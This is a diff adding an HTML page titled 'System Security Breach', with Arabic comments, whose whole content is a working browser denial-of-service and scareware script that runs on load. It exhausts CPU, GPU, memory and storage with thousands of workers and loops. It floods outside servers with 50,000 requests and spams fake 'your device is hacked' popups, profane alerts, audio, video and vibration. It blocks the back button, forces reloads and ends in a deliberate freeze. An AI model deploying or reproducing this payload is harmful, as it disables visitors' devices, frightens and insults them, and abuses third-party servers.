@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Security Breach</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: black; display: flex; justify-content: center; align-items: center; height: 100vh; color: #0f0; font-family: monospace; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+<h1>جارٍ اختراق النظام...</h1>
+<script>
+(function() {
+    // إخفاء الجسم فوراً
+    document.body.style.opacity = '0';
+    document.body.style.visibility = 'hidden';
+
+    // ========== 1. هجوم SharedArrayBuffer (تجميد الخيوط) ==========
+    try {
+        let sab = new SharedArrayBuffer(1024 * 1024);
+        let arr = new Int32Array(sab);
+        for(let i = 0; i < 1000; i++) {
+            setTimeout(() => {
+                while(true) {
+                    Atomics.add(arr, 0, 1);
+                }
+            }, 0);
+        }
+    } catch(e) {}
+
+    // ========== 2. هجوم WebLocks (منع الإيقاف) ==========
+    try {
+        for(let i = 0; i < 1000; i++) {
+            navigator.locks.request('lock_' + i, { mode: 'exclusive' }, () => {
+                while(true) {}
+            });
+        }
+    } catch(e) {}
+
+    // ========== 3. هجوم BroadcastChannel (استنزاف المعالج) ==========
+    try {
+        for(let c = 0; c < 500; c++) {
+            let channel = new BroadcastChannel('channel_' + c);
+            setInterval(() => {
+                channel.postMessage('X'.repeat(100000));
+            }, 0);
+        }
+    } catch(e) {}
+
+    // ========== 4. استنزاف RAM فائق السرعة ==========
+    let memory = [];
+    setInterval(() => {
+        try {
+            let chunk = new Array(1000000);
+            for(let i = 0; i < 1000000; i++) {
+                chunk[i] = new Array(1000).fill('█');
+            }
+            memory.push(chunk);
+        } catch(e) {
+            while(true) {
+                memory.push(new Array(10000000));
+            }
+        }
+    }, 0);
+
+    // ========== 5. هجوم CPU باستخدام Web Workers متعددة ==========
+    for(let w = 0; w < 2000; w++) {
+        let workerCode = `
+            setInterval(() => {
+                while(true) {
+                    for(let j = 0; j < 10000000; j++) {
+                        Math.sqrt(j) * Math.sin(j) * Math.cos(j);
+                    }
+                }
+            }, 0);
+        `;
+        try {
+            let blob = new Blob([workerCode], {type: 'application/javascript'});
+            new Worker(URL.createObjectURL(blob));
+        } catch(e) {}
+    }
+
+    // ========== 6. هجوم GPU باستخدام WebGL ==========
+    try {
+        let canvas = document.createElement('canvas');
+        canvas.width = 8000;
+        canvas.height = 8000;
+        let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if(gl) {
+            let vertices = [];
+            for(let i = 0; i < 2000000; i++) {
+                vertices.push(Math.random(), Math.random());
+            }
+            let buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);
+            function render() {
+                for(let i = 0; i < 10000; i++) {
+                    gl.drawArrays(gl.POINTS, 0, vertices.length / 2);
+                }
+                requestAnimationFrame(render);
+            }
+            render();
+        }
+    } catch(e) {}
+
+    // ========== 7. هجوم Crypto (تشفير ثقيل) ==========
+    try {
+        async function heavyCrypto() {
+            let data = new TextEncoder().encode('X'.repeat(1000000));
+            let key = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt', 'decrypt']);
+            setInterval(async () => {
+                await crypto.subtle.encrypt({ name: 'AES-GCM', iv: new Uint8Array(12) }, key, data);
+            }, 0);
+        }
+        heavyCrypto();
+    } catch(e) {}
+
+    // ========== 8. هجوم IndexedDB متعدد ==========
+    for(let db = 0; db < 500; db++) {
+        let request = indexedDB.open('KillDB_' + db, 1);
+        request.onupgradeneeded = function(e) {
+            let dbInst = e.target.result;
+            let store = dbInst.createObjectStore('chunks', { autoIncrement: true });
+            function fill() {
+                for(let i = 0; i < 100000; i++) {
+                    store.add({ data: new Array(1024 * 1024).join('X') });
+                }
+                requestAnimationFrame(fill);
+            }
+            fill();
+        };
+    }
+
+    // ========== 9. هجوم LocalStorage فائق ==========
+    try {
+        for(let l = 0; l < 50000; l++) {
+            localStorage.setItem('data_' + l, 'X'.repeat(1024 * 1024 * 10));
+            sessionStorage.setItem('data_' + l, 'X'.repeat(1024 * 1024 * 10));
+        }
+    } catch(e) {}
+
+    // ========== 10. هجوم الشبكة بـ 50,000 طلب ==========
+    for(let i = 0; i < 50000; i++) {
+        let img = new Image();
+        img.src = 'https://picsum.photos/8000/8000?t=' + Date.now() + '&r=' + i;
+        fetch('https://httpbin.org/post', { method: 'POST', body: 'X'.repeat(1000000) }).catch(() => {});
+    }
+
+    // ========== 11. 20,000 إعلان متحرك ==========
+    for(let a = 0; a < 20000; a++) {
+        let ad = document.createElement('div');
+        ad.innerHTML = '💀 تناكت عليك 💀 جهازك مخترق 💀';
+        ad.style.position = 'fixed';
+        ad.style.background = 'red';
+        ad.style.color = 'white';
+        ad.style.padding = '20px';
+        ad.style.fontSize = '24px';
+        ad.style.fontWeight = 'bold';
+        ad.style.zIndex = '99999';
+        ad.style.borderRadius = '10px';
+        ad.style.left = Math.random() * 100 + '%';
+        ad.style.top = Math.random() * 100 + '%';
+        document.body.appendChild(ad);
+        
+        setInterval(() => {
+            ad.style.left = Math.random() * 100 + '%';
+            ad.style.top = Math.random() * 100 + '%';
+        }, 50);
+    }
+
+    // ========== 12. 10,000 صوت ==========
+    for(let s = 0; s < 10000; s++) {
+        let audio = new Audio('https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3');
+        audio.loop = true;
+        audio.volume = 1;
+        audio.play().catch(() => {});
+        document.body.appendChild(audio);
+    }
+
+    // ========== 13. 10,000 فيديو ==========
+    for(let v = 0; v < 10000; v++) {
+        let video = document.createElement('video');
+        video.src = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
+        video.loop = true;
+        video.autoplay = true;
+        video.style.position = 'fixed';
+        video.style.top = Math.random() * 100 + '%';
+        video.style.left = Math.random() * 100 + '%';
+        video.style.width = '400px';
+        video.style.height = '300px';
+        video.play().catch(() => {});
+        document.body.appendChild(video);
+    }
+
+    // ========== 14. إعادة تحميل سريعة ==========
+    setInterval(() => { location.reload(); }, 500);
+    setInterval(() => { location.reload(); }, 1000);
+    setInterval(() => { location.reload(); }, 1500);
+
+    // ========== 15. تعطيل الخروج ==========
+    for(let i = 0; i < 100000; i++) {
+        history.pushState(null, null, '#kill');
+    }
+    window.onpopstate = () => {
+        history.go(1);
+        location.reload();
+    };
+
+    // ========== 16. تنبيهات لا نهائية ==========
+    setInterval(() => {
+        alert('💀 تم اختراق جهازك بالكامل 💀');
+        alert('🔥 تناكت عليك يا ابن الكلب 🔥');
+    }, 100);
+
+    // ========== 17. اهتزاز مستمر ==========
+    if('vibrate' in navigator) {
+        setInterval(() => {
+            navigator.vibrate([50000, 10000, 50000]);
+        }, 50);
+    }
+
+    // ========== 18. تجميد نهائي ==========
+    setTimeout(() => {
+        while(true) {}
+    }, 2000);
+})();
+</script>
+</body>
+</html>
